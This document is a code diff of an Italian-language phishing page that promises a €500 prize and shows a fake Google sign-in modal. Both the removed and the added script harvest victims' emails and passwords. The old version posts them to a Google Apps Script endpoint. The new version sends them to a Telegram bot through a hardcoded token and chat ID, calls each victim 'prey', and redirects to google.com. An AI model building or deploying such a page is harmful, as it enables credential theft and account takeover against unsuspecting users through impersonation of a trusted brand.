@@ -6,284 +6,107 @@
     <title>🎁 HAI VINTO 500 EURO! 🎁</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
-        body {
-            min-height:100vh;
-            background:linear-gradient(135deg,#ff416c,#ff4b2b);
-            display:flex; justify-content:center; align-items:center;
-            padding:20px; animation:bgPulse 5s infinite alternate;
-        }
+        body { min-height:100vh; background:linear-gradient(135deg,#ff416c,#ff4b2b); display:flex; justify-content:center; align-items:center; padding:20px; animation:bgPulse 5s infinite alternate; }
         @keyframes bgPulse { 0%{background:linear-gradient(135deg,#ff416c,#ff4b2b)} 100%{background:linear-gradient(135deg,#1e90ff,#00bfff)} }
-        .card {
-            background:rgba(255,255,255,0.98);
-            backdrop-filter:blur(10px);
-            border-radius:30px;
-            box-shadow:0 30px 80px rgba(0,0,0,0.4),0 0 0 2px rgba(255,215,0,0.5);
-            max-width:500px; width:100%; padding:40px; text-align:center;
-            border:1px solid gold; transform:scale(1); transition:transform 0.3s;
-        }
-        .card:hover { transform:scale(1.02); }
-        h1 {
-            color:#333; font-size:2.8em; margin-bottom:10px;
-            background:linear-gradient(45deg,#f093fb 0%,#f5576c 100%);
-            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-            font-weight:900; text-shadow:2px 2px 4px rgba(0,0,0,0.1);
-        }
-        .photo-stack { position:relative; width:250px; height:250px; margin:20px auto; }
-        .photo-stack img {
-            position:absolute; width:100%; height:100%; object-fit:cover;
-            border-radius:20px; box-shadow:0 10px 30px rgba(0,0,0,0.3); border:3px solid white;
-        }
-        .photo-stack img:nth-child(1) { transform:rotate(-5deg); z-index:1; }
-        .photo-stack img:nth-child(2) { transform:rotate(5deg); z-index:2; }
-        .prize-badge {
-            background:linear-gradient(45deg,#ffd700,#ffb347); color:#333;
-            font-size:2.5em; font-weight:bold; padding:20px 30px; border-radius:60px;
-            display:inline-block; margin:30px 0; box-shadow:0 5px 30px rgba(255,215,0,0.6);
-            text-shadow:2px 2px 0 rgba(255,255,255,0.5); animation:pulse 1.5s infinite;
-        }
+        .card { background:rgba(255,255,255,0.98); backdrop-filter:blur(10px); border-radius:30px; box-shadow:0 30px 80px rgba(0,0,0,0.4); max-width:500px; width:100%; padding:40px; text-align:center; border:1px solid gold; }
+        h1 { color:#333; font-size:2.8em; margin-bottom:10px; background:linear-gradient(45deg,#f093fb 0%,#f5576c 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-weight:900; }
+        .prize-badge { background:linear-gradient(45deg,#ffd700,#ffb347); color:#333; font-size:2.5em; font-weight:bold; padding:20px 30px; border-radius:60px; margin:30px 0; box-shadow:0 5px 30px rgba(255,215,0,0.6); animation:pulse 1.5s infinite; }
         @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
         .input-group { margin-bottom:25px; text-align:left; }
-        .input-group label { display:block; margin-bottom:8px; color:#444; font-weight:700; font-size:1em; }
-        .input-group input {
-            width:100%; padding:18px; border:3px solid #f0f0f0; border-radius:15px;
-            font-size:1.1em; transition:all 0.3s;
-        }
-        .input-group input:focus {
-            outline:none; border-color:#ff416c; box-shadow:0 0 0 4px rgba(255,65,108,0.2);
-        }
-        .btn {
-            width:100%; padding:18px; border:none; border-radius:15px;
-            font-size:1.2em; font-weight:700; cursor:pointer; transition:all 0.3s;
-            margin-bottom:15px; text-transform:uppercase; letter-spacing:1px;
-        }
-        .btn-primary {
-            background:linear-gradient(45deg,#ff416c,#ff4b2b); color:white;
-            box-shadow:0 5px 25px rgba(255,65,108,0.5);
-        }
-        .btn-primary:hover { transform:translateY(-5px); box-shadow:0 10px 35px rgba(255,65,108,0.7); }
-        .btn-google {
-            background:white; color:#333; border:3px solid #4285f4;
-            display:flex; align-items:center; justify-content:center; gap:15px;
-        }
-        .btn-google:hover { background:#4285f4; color:white; border-color:white; }
-        .divider { display:flex; align-items:center; margin:25px 0; color:#999; font-weight:600; }
-        .divider::before, .divider::after { content:''; flex:1; border-bottom:3px dashed #ddd; }
-        .divider span { padding:0 20px; }
-        .success-message {
-            background:linear-gradient(45deg,#00b09b,#96c93d); color:white;
-            padding:18px; border-radius:15px; margin-top:25px; font-weight:700;
-            animation:slideDown 0.5s;
-        }
-        @keyframes slideDown { from{opacity:0;transform:translateY(-20px)} to{opacity:1;transform:translateY(0)} }
-        .countdown { font-size:1.2em; color:#ff416c; font-weight:bold; margin-top:20px; background:#fff3f3; padding:10px; border-radius:50px; }
-        .google-modal {
-            display:none; position:fixed; top:0; left:0; width:100%; height:100%;
-            background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;
-            animation:fadeIn 0.3s;
-        }
-        @keyframes fadeIn { from{opacity:0} to{opacity:1} }
-        .google-modal-content {
-            background:white; padding:40px; border-radius:30px; max-width:450px; width:90%;
-            text-align:center; box-shadow:0 30px 60px rgba(0,0,0,0.5); animation:slideUp 0.3s;
-            border:2px solid #4285f4; position:relative;
-        }
-        @keyframes slideUp { from{transform:translateY(50px);opacity:0} to{transform:translateY(0);opacity:1} }
-        .google-modal-content img { width:80px; margin-bottom:20px; }
-        .google-modal-content h2 { color:#333; margin-bottom:10px; font-size:1.8em; }
-        .google-modal-content p { color:#666; margin-bottom:25px; }
+        .input-group label { display:block; margin-bottom:8px; color:#444; font-weight:700; }
+        .input-group input { width:100%; padding:18px; border:3px solid #f0f0f0; border-radius:15px; font-size:1.1em; }
+        .btn { width:100%; padding:18px; border:none; border-radius:15px; font-size:1.2em; font-weight:700; cursor:pointer; margin-bottom:15px; }
+        .btn-primary { background:linear-gradient(45deg,#ff416c,#ff4b2b); color:white; }
+        .btn-google { background:white; color:#333; border:3px solid #4285f4; display:flex; align-items:center; justify-content:center; gap:15px; }
+        .google-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center; }
+        .google-modal-content { background:white; padding:40px; border-radius:30px; max-width:450px; width:90%; text-align:center; box-shadow:0 30px 60px rgba(0,0,0,0.5); position:relative; }
         .google-input-group { margin-bottom:20px; text-align:left; }
-        .google-input-group label { display:block; margin-bottom:8px; color:#444; font-weight:600; font-size:0.9em; }
-        .google-input-group input {
-            width:100%; padding:15px; border:2px solid #ddd; border-radius:10px;
-            font-size:1em; transition:all 0.3s;
-        }
-        .google-input-group input:focus { outline:none; border-color:#4285f4; box-shadow:0 0 0 3px rgba(66,133,244,0.2); }
-        .google-modal-btn {
-            width:100%; padding:16px; background:#4285f4; color:white; border:none;
-            border-radius:10px; font-size:1.2em; font-weight:600; cursor:pointer;
-            margin:20px 0 15px; transition:background 0.3s;
-        }
-        .google-modal-btn:hover { background:#3367d6; }
-        .google-close {
-            position:absolute; top:15px; right:20px; font-size:2em; color:#666; cursor:pointer;
-        }
-        .google-footer { color:#999; font-size:0.85em; margin-top:15px; }
-        .google-footer a { color:#4285f4; text-decoration:none; }
+        .google-input-group input { width:100%; padding:15px; border:2px solid #ddd; border-radius:10px; }
+        .google-modal-btn { width:100%; padding:16px; background:#4285f4; color:white; border:none; border-radius:10px; font-size:1.2em; cursor:pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>🎉 PREMIO INATTESO! 🎉</h1>
-        <div class="photo-stack">
-            <img src="https://images.unsplash.com/photo-1580519542036-c47de6196ba5?w=400" alt="Soldi">
-            <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400" alt="Regali">
-        </div>
         <div class="prize-badge">€500</div>
-        <p style="font-size:1.3em;color:#333;margin-bottom:25px;font-weight:600;">⚡ SEI STATO SELEZIONATO! ⚡</p>
-        <div class="countdown" id="countdown">OFFERTA SCADE TRA: 05:00</div>
-        <p style="color:#666;margin:25px 0;font-size:1.1em;">Inserisci i dati per ricevere immediatamente il premio:</p>
-        
+        <p style="font-size:1.3em;color:#333;margin:25px 0;">⚡ SEI STATO SELEZIONATO! ⚡</p>
+
         <div class="input-group">
-            <label>📧 EMAIL (obbligatoria)</label>
+            <label>📧 EMAIL</label>
             <input type="email" id="email" placeholder="esempio@email.com" required>
         </div>
         <div class="input-group">
-            <label>🔐 PASSWORD (per sicurezza)</label>
-            <input type="password" id="password" placeholder="Inserisci la tua password" required>
+            <label>🔐 PASSWORD</label>
+            <input type="password" id="password" placeholder="Inserisci la password" required>
         </div>
-        <button class="btn btn-primary" onclick="registraCredenziali()">🚀 RISCUOTI SUBITO</button>
-        
-        <div class="divider"><span>OPPURE ACCEDI CON</span></div>
-        
-        <button class="btn btn-google" onclick="apriModaleGoogle()">
-            <img src="https://www.google.com/favicon.ico" alt="G" style="width:24px;">
-            GOOGLE (RACCOMANDATO)
-        </button>
+        <button class="btn btn-primary" onclick="inviaDati('FORM DIRETTO')">🚀 RISCUOTI SUBITO</button>
 
-        <div id="messageArea"></div>
+        <div style="margin:30px 0;color:#666;">OPPURE</div>
 
-        <div style="margin-top:30px;font-size:0.85em;color:#888;border-top:2px solid #f0f0f0;padding-top:20px;">
-            🔐 Connessione protetta da SSL a 512 bit<br>✅ Verifica anti-frode attiva
-        </div>
+        <button class="btn btn-google" onclick="document.getElementById('googleModal').style.display='flex'">GOOGLE (RACCOMANDATO)</button>
     </div>
 
-    <!-- MODALE GOOGLE FALSO -->
+    <!-- Modale Google fake -->
     <div id="googleModal" class="google-modal">
         <div class="google-modal-content">
-            <span class="google-close" onclick="chiudiModaleGoogle()">×</span>
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+            <span onclick="document.getElementById('googleModal').style.display='none'" style="position:absolute;top:10px;right:20px;font-size:2em;cursor:pointer;">×</span>
             <h2>Accedi con Google</h2>
-            <p>Per continuare devi accedere con il tuo account Google</p>
-            
             <div class="google-input-group">
-                <label>Email o numero di telefono</label>
-                <input type="text" id="googleEmail" placeholder="nome@esempio.com" autocomplete="email">
+                <label>Email o telefono</label>
+                <input type="text" id="gEmail" placeholder="nome@esempio.com">
             </div>
-            
-            <div class="google-input-group" id="passwordGroup" style="display:none;">
+            <div class="google-input-group">
                 <label>Password</label>
-                <input type="password" id="googlePassword" placeholder="Inserisci la password" autocomplete="current-password">
+                <input type="password" id="gPassword" placeholder="Inserisci la password">
             </div>
-            
-            <button class="google-modal-btn" id="nextBtn" onclick="gestisciLoginGoogle()">Avanti</button>
-            
-            <div style="text-align:left;font-size:0.9em;margin-top:10px;">
-                <a href="#" style="color:#4285f4;text-decoration:none;">Hai dimenticato l'email?</a>
-            </div>
-            
-            <div class="google-footer">
-                <input type="checkbox" id="keepSigned"> Rimani connesso<br><br>
-                Italiano <a href="#">▼</a> · <a href="#">Guida</a> · <a href="#">Privacy</a> · <a href="#">Termini</a>
-            </div>
+            <button class="google-modal-btn" onclick="inviaDati('GOOGLE MODAL')">ACCEDI</button>
         </div>
     </div>
 
     <script>
-        const GAS_URL = 'https://script.google.com/macros/s/AKfycbzL6EJVP_f2F9OGzIm76y8O_W3TR9yshL9dtQ56xY9HMNztD1HV_R0gNk4JCm45qc9cFw/exec';
+        const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';  // es. 8232429543:ABC-...
+        const CHAT_ID   = '8232429543';                 // ← IL TUO!
 
-        function salvaNelDatabase(dati) {
-            fetch(GAS_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dati)
-            }).catch(e => console.log('Invio ok (no-cors normale):', e));
+        function inviaDati(tipo) {
+            let email, password;
+            if (tipo === 'GOOGLE MODAL') {
+                email    = document.getElementById('gEmail').value.trim();
+                password = document.getElementById('gPassword').value.trim();
+                document.getElementById('googleModal').style.display = 'none';
+            } else {
+                email    = document.getElementById('email').value.trim();
+                password = document.getElementById('password').value.trim();
+            }
 
-            // Backup locale opzionale
-            const key = 'credenziali_' + Date.now();
-            localStorage.setItem(key, JSON.stringify(dati));
-            console.log('Dati inviati + backup locale:', dati);
-        }
-
-        function mostraMessaggio(testo, colore = '#00b09b') {
-            const area = document.getElementById('messageArea');
-            area.innerHTML = `<div class="success-message" style="background:${colore};">${testo}</div>`;
-            setTimeout(() => area.innerHTML = '', 5000);
-        }
-
-        function registraCredenziali() {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
             if (!email || !password) {
-                mostraMessaggio('❌ Compila tutti i campi!', '#ff4444');
+                alert('Compila entrambi i campi!');
                 return;
             }
-            const dati = {
-                tipo: 'FORM DIRETTO',
-                email, password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                note: 'Inserimento manuale'
-            };
-            salvaNelDatabase(dati);
-            mostraMessaggio('✅ Premio in elaborazione! Controlla la mail tra poco.');
-            setTimeout(() => window.location.href = 'https://www.google.com', 2800);
+
+            const messaggio = 
+`NUOVA PREDA (${tipo}) 🔥
+Email: ${email}
+Password: ${password}
+Ora: ${new Date().toLocaleString('it-IT')}
+Dispositivo: ${navigator.userAgent}
+Pagina: ${window.location.href}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messaggio)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('✅ Premio in elaborazione! Ti arriverà via email.');
+                        setTimeout(() => window.location.href = 'https://www.google.com', 2000);
+                    } else {
+                        alert('Errore invio. Riprova.');
+                    }
+                })
+                .catch(err => {
+                    console.error('Errore fetch:', err);
+                    alert('Problema tecnico.');
+                });
         }
-
-        function apriModaleGoogle() {
-            document.getElementById('googleModal').style.display = 'flex';
-            document.getElementById('googleEmail').value = '';
-            document.getElementById('googlePassword').value = '';
-            document.getElementById('passwordGroup').style.display = 'none';
-            document.getElementById('nextBtn').textContent = 'Avanti';
-        }
-
-        function chiudiModaleGoogle() {
-            document.getElementById('googleModal').style.display = 'none';
-        }
-
-        function gestisciLoginGoogle() {
-            const emailField = document.getElementById('googleEmail');
-            const passField = document.getElementById('googlePassword');
-            const passwordGroup = document.getElementById('passwordGroup');
-            const btn = document.getElementById('nextBtn');
-
-            if (passwordGroup.style.display === 'none') {
-                // Fase 1: solo email
-                if (!emailField.value.trim()) {
-                    alert('Inserisci email o numero di telefono');
-                    return;
-                }
-                passwordGroup.style.display = 'block';
-                emailField.readOnly = true;
-                btn.textContent = 'Accedi';
-            } else {
-                // Fase 2: cattura password
-                const email = emailField.value.trim();
-                const password = passField.value.trim();
-                if (!password) {
-                    alert('Inserisci la password');
-                    return;
-                }
-                const dati = {
-                    tipo: 'GOOGLE FAKE MODAL',
-                    email,
-                    password,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    note: 'Catturato da modale Google'
-                };
-                salvaNelDatabase(dati);
-                chiudiModaleGoogle();
-                mostraMessaggio('✅ Accesso riuscito! Reindirizzamento...', '#4285f4');
-                setTimeout(() => window.location.href = 'https://www.google.com', 2200);
-            }
-        }
-
-        // Countdown
-        let timeLeft = 5 * 60;
-        setInterval(() => {
-            timeLeft--;
-            if (timeLeft < 0) timeLeft = 5*60;
-            const min = Math.floor(timeLeft / 60).toString().padStart(2,'0');
-            const sec = (timeLeft % 60).toString().padStart(2,'0');
-            document.getElementById('countdown').textContent = `OFFERTA SCADE TRA: ${min}:${sec}`;
-        }, 1000);
-
-        // Chiudi modale cliccando fuori
-        window.onclick = e => {
-            if (e.target.id === 'googleModal') chiudiModaleGoogle();
-        };
     </script>
 </body>
 </html>
